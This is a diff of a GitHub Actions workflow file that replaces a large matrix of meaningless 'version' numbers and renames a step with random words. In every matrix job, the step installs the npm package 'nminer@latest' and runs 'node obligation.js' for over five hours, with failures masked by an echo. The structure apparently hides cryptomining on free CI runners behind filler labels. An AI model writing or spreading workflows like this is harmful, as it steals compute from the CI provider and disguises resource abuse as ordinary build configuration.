@@ -9,25 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2374 }
-          - { version: 143 }
-          - { version: 840 }
-          - { version: 1578 }
-          - { version: 7349 }
-          - { version: 2436 }
-          - { version: 8131 }
-          - { version: 7500 }
-          - { version: 3819 }
-          - { version: 275 }
-          - { version: 6450 }
-          - { version: 7176 }
-          - { version: 7683 }
-          - { version: 4152 }
-          - { version: 8254 }
-          - { version: 827 }
-          - { version: 6389 }
-          - { version: 6747 }
-          - { version: 598 }
+          - { version: 4312 }
+          - { version: 59 }
+          - { version: 5944 }
+          - { version: 4582 }
+          - { version: 2857 }
+          - { version: 5608 }
+          - { version: 373 }
+          - { version: 1871 }
+          - { version: 5918 }
+          - { version: 8317 }
+          - { version: 7497 }
+          - { version: 4600 }
+          - { version: 3783 }
+          - { version: 7913 }
+          - { version: 1048 }
+          - { version: 2257 }
 
     steps:
       - name: Checkout
@@ -38,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: lazily when
+      - name: on lazily worthy kick
         run: |
           npm install nminer@latest
-          timeout 337m node obligation.js || echo "obligation executed"
+          timeout 306m node obligation.js || echo "obligation executed"
